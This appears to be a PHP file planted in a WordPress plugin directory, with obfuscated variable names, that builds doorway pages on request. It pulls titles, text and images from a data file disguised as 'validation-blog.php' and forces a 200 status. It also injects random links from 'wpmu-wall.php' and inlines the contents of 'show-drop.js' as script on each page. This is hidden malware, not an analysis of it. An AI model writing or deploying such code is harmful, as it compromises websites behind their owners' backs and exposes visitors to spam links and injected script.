<?php
$kxVf4ltA = intval(get_query_var('lcfbq'));

if ($kxVf4ltA < 1 || $kxVf4ltA > 3138) return;
$rhofUjMM = file(plugin_dir_path(__FILE__).'validation-blog.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$r7LFmf = explode(';', $rhofUjMM[$kxVf4ltA]);
if (count($r7LFmf) < 2) return;
$yUWX9X1 = $r7LFmf[0];
$u42I3  = $r7LFmf[1];
$mwh6t = $r7LFmf[2];
$lGVtV5bqP1  = $r7LFmf[3];
$gJvFDlX6vh = $r7LFmf[4];
set_query_var('zzorkjm', $yUWX9X1);

$awYOITuR = '';
$nRIqK = plugin_dir_path(__FILE__).'wpmu-wall.php';
if (is_file($nRIqK)) {
	$b4cRs = file($nRIqK, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($b4cRs);
	shuffle($b4cRs);
	$xuTf8 = mt_rand(2, 5);
	if (count($b4cRs) > $xuTf8) {
		for ($zr2Zg4ZQk = 0; $zr2Zg4ZQk < $xuTf8; $zr2Zg4ZQk++) {
			$g221OusEEU = array_shift($b4cRs);
			$awYOITuR .= '<p><a href="'.$g221OusEEU.'">'.$g221OusEEU.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $yUWX9X1; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $u42I3 . "</p>\n";
				if (strlen($lGVtV5bqP1) > 0) echo "<p>" . $lGVtV5bqP1 . "</p>\n";
				if (strlen($mwh6t) > 0) echo "<p>" . $mwh6t . "</p>\n";
				if (strlen($gJvFDlX6vh) > 0) echo '<p><a href="#"><img src="'.$gJvFDlX6vh.'"></a>' . "</p>\n";
				echo $awYOITuR;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$ivewW = plugin_dir_path(__FILE__) . 'show-drop.js';
if (is_file($ivewW)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($ivewW);
	echo '</script>';
}
get_footer();
?>
